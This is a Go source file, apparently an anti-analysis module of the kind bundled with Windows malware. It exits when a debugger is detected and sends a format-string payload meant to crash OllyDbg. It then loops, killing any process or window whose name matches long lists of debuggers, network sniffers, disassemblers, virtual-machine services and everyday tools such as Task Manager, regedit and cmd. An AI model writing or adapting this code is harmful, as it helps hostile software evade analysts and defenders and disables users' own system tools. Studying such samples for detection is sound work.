package antidebug

import (
	"os"
	"strings"
	"syscall"
	"unsafe"

	"github.com/shirou/gopsutil/v3/process"
)

var (
	user32DLL       = syscall.NewLazyDLL("user32.dll")
	enumWindowsProc = user32DLL.NewProc("EnumWindows")
	getWindowText   = user32DLL.NewProc("GetWindowTextA")
	getWindowThread = user32DLL.NewProc("GetWindowThreadProcessId")

	kernel32DLL = syscall.NewLazyDLL("kernel32.dll")
	isDebugger  = kernel32DLL.NewProc("IsDebuggerPresent")
	debugString = kernel32DLL.NewProc("OutputDebugStringA")
)

func killProcess(pid int32) error {
	process, err := os.FindProcess(int(pid))
	if err != nil {
		return err
	}
	return process.Kill()
}

func KillProcessesByNames(blacklist []string) error {
	processes, _ := process.Processes()

	for _, p := range processes {
		processName, _ := p.Name()

		if contains(blacklist, processName) {
			killProcess(p.Pid)
		}
	}

	return nil
}

func getCallback(blacklist []string) uintptr {
	return syscall.NewCallback(func(hwnd syscall.Handle, lparam uintptr) uintptr {
		var title [256]byte

		getWindowText.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&title)), uintptr(len(title)))

		titleStr := string(title[:])

		if titleStr == "" {
			return 1
		}

		if contains(blacklist, titleStr) {
			var pid uint32
			getWindowThread.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&pid)))

			killProcess(int32(pid))

		}
		return 1
	})
}

func KillProcessesByWindowsNames(callback uintptr) error {
	enumWindowsProc.Call(callback, 0)
	return nil
}

func IsDebuggerPresent() bool {
	flag, _, _ := isDebugger.Call()
	return flag != 0
}

func outputDebugString(message string) {
	debugString.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(message))))
}

func OutputDebugStringAntiDebug() {
	outputDebugString("hm")
}

func OutputDebugStringOllyDbgExploit() {
	outputDebugString("%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s")
}

func contains(slice []string, processName string) bool {
	processName = strings.ToLower(processName)

	for _, s := range slice {
		if strings.Contains(processName, s) {
			return true
		}
	}

	return false
}

func Run() {
	if IsDebuggerPresent() {
		os.Exit(0)
	}

	blacklist := []string{
		"ksdumperclient", "regedit", "ida64", "vmtoolsd", "vgauthservice",
		"wireshark", "x32dbg", "ollydbg", "vboxtray", "df5serv", "vmsrvc",
		"vmusrvc", "taskmgr", "vmwaretray", "xenservice", "pestudio", "vmwareservice",
		"qemu-ga", "prl_cc", "prl_tools", "cmd",
		"joeboxcontrol", "vmacthlp", "httpdebuggerui", "processhacker",
		"joeboxserver", "fakenet", "ksdumper", "vmwareuser", "fiddler",
		"x96dbg", "dumpcap", "vboxservice",
	}

	callback := getCallback([]string{
		"simpleassemblyexplorer", "dojandqwklndoqwd", "centos", "process hacker 2",
		"procmon64", "process hacker", "sae", "sharpod", "http debugger",
		"dbgclr", "x32dbg", "sniffer", "petools", "simpleassembly", "ksdumper", "dnspy", "x96dbg",
		"de4dot", "zed", "exeinfope", "windbg", "mdb", "harmony", "systemexplorerservice", "megadumper",
		"system explorer", "mdbg", "kdb", "charles", "stringdecryptor", "phantom", "folder",
		"debugger", "extremedumper", "pc-ret", "dbg", "dojandqwklndoqwd-x86", "folderchangesview", "james",
		"process monitor", "protection_id", "de4dotmodded", "x32_dbg", "pizza", "fiddler", "checker",
		"x64_dbg", "httpanalyzer", "strongod", "wireshark", "gdb", "graywolf", "x64dbg", "ksdumper v1.1 - by equifox",
		"wpe pro", "ilspy", "dbx", "ollydbg", "x64netdumper", "scyllahide", "kgdb", "systemexplorer",
		"proxifier", "debug", "httpdebug", "httpdebugger", "0harmony", "mitmproxy", "ida -",
		"codecracker", "ghidra", "titanhide", "hxd", "reversal",
	})

	for {
		OutputDebugStringAntiDebug()
		OutputDebugStringOllyDbgExploit()

		KillProcessesByNames(blacklist)
		KillProcessesByWindowsNames(callback)
	}
}
